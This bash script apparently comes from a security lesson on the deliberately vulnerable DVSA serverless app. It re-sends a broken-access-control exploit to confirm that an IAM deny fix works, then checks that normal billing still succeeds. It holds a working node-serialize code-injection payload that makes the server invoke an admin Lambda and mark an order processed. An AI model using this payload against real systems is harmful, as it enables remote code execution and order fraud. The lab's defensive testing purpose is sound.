#!/bin/bash

# Lesson 5 - Broken Access Control Verification
# Purpose:
# After applying the IAM deny policy to the DVSA-ORDER-MANAGER role,
# repeat the same exploit on a new order and confirm the order is not updated
# by the exploit. Then confirm normal billing still works.

set -e

if [ -z "$API" ] || [ -z "$TOKEN" ]; then
  echo "Missing required environment variables."
  echo "Set these first:"
  echo 'export API="https://YOUR_API.execute-api.us-east-1.amazonaws.com/STAGE/order"'
  echo 'export TOKEN="PASTE_USER_TOKEN"'
  exit 1
fi

mkdir -p evidence/lesson-05

echo "[1] Create a new post-fix order..."

CREATE_RESPONSE=$(curl -s "$API" \
  -H "content-type: application/json" \
  -H "authorization: $TOKEN" \
  --data-raw '{"action":"new","cart-id":"lesson5-after-fix","items":{"11":1,"12":1}}')

echo "$CREATE_RESPONSE" | tee evidence/lesson-05/verify-01-create-order.json | jq

ORDER_ID=$(echo "$CREATE_RESPONSE" | jq -r '."order-id" // ."orderId" // .order_id // empty')

if [ -z "$ORDER_ID" ]; then
  echo "Could not automatically extract order ID."
  echo "Copy the order-id from verify-01-create-order.json and run:"
  echo 'export ORDER_ID="PASTE_NEW_ORDER_ID"'
  exit 1
fi

echo
echo "New order ID: $ORDER_ID"

echo
echo "[2] Add shipping to the new order..."

curl -s "$API" \
  -H "content-type: application/json" \
  -H "authorization: $TOKEN" \
  --data-raw "{\"action\":\"shipping\",\"order-id\":\"$ORDER_ID\",\"data\":{\"address\":\"123 Lesson 5 Street\",\"email\":\"student@example.com\",\"name\":\"Lesson Five User\"}}" \
  | tee evidence/lesson-05/verify-02-shipping.json | jq

echo
echo "[3] Generate post-fix exploit payload..."

TOKEN="$TOKEN" ORDER_ID="$ORDER_ID" python3 - <<'PY' > evidence/lesson-05/verify-03-postfix-exploit-payload.json
import os
import json
import time

token = os.environ["TOKEN"].strip()
order_id = os.environ["ORDER_ID"].strip()

admin_event = {
    "headers": {
        "authorization": token
    },
    "body": {
        "action": "update",
        "order-id": order_id,
        "item": {
            "token": "lesson5-demo-token",
            "ts": int(time.time()),
            "itemList": {
                "11": 1,
                "12": 1
            },
            "address": "123 Lesson 5 Street",
            "total": 74,
            "status": 120
        }
    }
}

payload = {
    "action": (
        "_$$ND_FUNC$$_function(){"
        "var p=JSON.stringify(" + json.dumps(admin_event) + ");"
        "var AWS=require(\"aws-sdk\");"
        "var l=new AWS.Lambda();"
        "var x={FunctionName:\"DVSA-ADMIN-UPDATE-ORDERS\",InvocationType:\"RequestResponse\",Payload:p};"
        "l.invoke(x,function(e,d){console.log(\"LESSON5_ADMIN_INVOKE_AFTER_FIX\", e, d);});"
        "}()"
    ),
    "cart-id": "lesson5-access-control-test-after-fix"
}

print(json.dumps(payload))
PY

cat evidence/lesson-05/verify-03-postfix-exploit-payload.json | jq

echo
echo "[4] Send the same exploit again after the IAM fix..."

curl -s "$API" \
  -H "content-type: application/json" \
  --data-binary @evidence/lesson-05/verify-03-postfix-exploit-payload.json \
  | tee evidence/lesson-05/verify-04-postfix-exploit-response.json | jq

echo
echo "Refresh DVSA -> My Orders now."
echo "Expected fixed result: the new order should NOT become processed."
echo "Take screenshot: 06-postfix-verification.png before running normal billing."

echo
echo "[5] Optional: press Enter after taking the screenshot to test normal billing."
read -r

echo
echo "[6] Run normal billing to confirm legitimate checkout still works..."

curl -s "$API" \
  -H "content-type: application/json" \
  -H "authorization: $TOKEN" \
  --data-raw "{\"action\":\"billing\",\"order-id\":\"$ORDER_ID\",\"data\":{\"ccn\":\"4242424242424242\",\"exp\":\"11/25\",\"cvv\":\"123\"}}" \
  | tee evidence/lesson-05/verify-05-normal-billing-after-fix.json | jq

echo
echo "Refresh DVSA -> My Orders again."
echo "Expected legitimate result: the order changes only through normal billing."
